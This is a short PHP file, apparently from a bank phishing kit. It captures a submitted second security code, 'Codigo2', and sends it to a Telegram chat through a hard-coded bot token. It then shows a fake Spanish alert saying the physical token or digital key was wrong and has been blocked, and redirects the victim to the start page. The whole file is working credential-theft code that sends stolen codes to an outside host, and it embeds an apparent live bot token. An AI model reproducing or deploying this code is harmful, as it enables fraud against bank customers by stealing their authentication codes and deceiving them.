<?php
@session_start();
ini_set("display_errors", 0);

if ( isset ($_POST['Codigo2']) ){

$message = "Cod2.: ".$_POST['Codigo2']."\r\n";

$apiToken = "55908326039:AAE4gsL71Y56dVGdd93KiB51BykG8dPAPYY";


$data = [
  'chat_id' => '5820591707',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



echo '<script language="javascript">alert("TOKEN FISICO O LLAVE DIGITAL INCORRECTO\r\n Por su seguridad se ha  bloqueado su toquen, intente de nuevo en 1 hora.");</script>';
echo '<script type="text/javascript">window.location.href = "/index.php";</script>';
}
?>